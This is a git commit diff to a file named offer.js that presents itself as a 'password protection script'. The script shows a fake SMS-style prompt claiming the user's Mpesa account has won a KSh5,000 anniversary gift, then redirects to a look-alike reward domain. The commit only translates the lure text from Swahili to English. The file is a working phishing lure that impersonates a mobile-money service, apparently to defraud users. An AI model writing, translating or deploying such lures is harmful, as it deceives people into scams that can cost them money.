27d8bc04c095fcd27b254ef2a81a02903ada80e2
uptomars <Kenoly555+me@gmail.com>
2025-07-26 02:54:52 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'KSh5,000'
-password=prompt('SMS: Hongera Akaunti yako ya Mpesa imetimiza masharti ya kupokea zawadi ya KSh5,000 ya Kuadhimisha Mwaka wa MoMo, Tafadhali Bonyeza SAWA ILI KUENDELEA ','KSh5,000');
+password=prompt('SMS: Congratulations, your Mpesa account has qualified to receive the KSh5,000 Mpesa Anniversary gift, Please Click OK TO CONTINUE ','KSh5,000');
 if (password != 'KSh5,000') {
 location.href='https://mpesa-reward.allprograms.xyz/gift';
 }
